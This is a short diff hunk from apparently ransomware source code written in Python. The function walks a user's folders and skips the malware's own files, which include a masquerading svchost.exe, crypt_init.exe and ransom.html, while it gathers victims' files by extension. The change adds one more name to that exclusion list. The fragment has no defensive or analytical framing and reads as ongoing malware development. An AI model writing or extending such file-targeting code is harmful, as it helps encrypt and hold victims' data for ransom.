@@ -46,7 +46,7 @@ def filelist():
         for root, dirs, files in os.walk(user):
             for file in files:
                 my_files = ["GuiCounter.exe", "svchost.exe", "image.jpg", "windows-installer.ico", \
-                "crypt_init.exe", "vcruntime140.dll", "python37.dll", "python3.dll", "ransom.html", \
+                "crypt_init.exe", "id", "vcruntime140.dll", "python37.dll", "python3.dll", "ransom.html", \
                 "tk86t.dll", "tcl86t.dll", "library.zip", "tclIndex" ]
                 if not(file in my_files):
                     for ext in file.split("."):
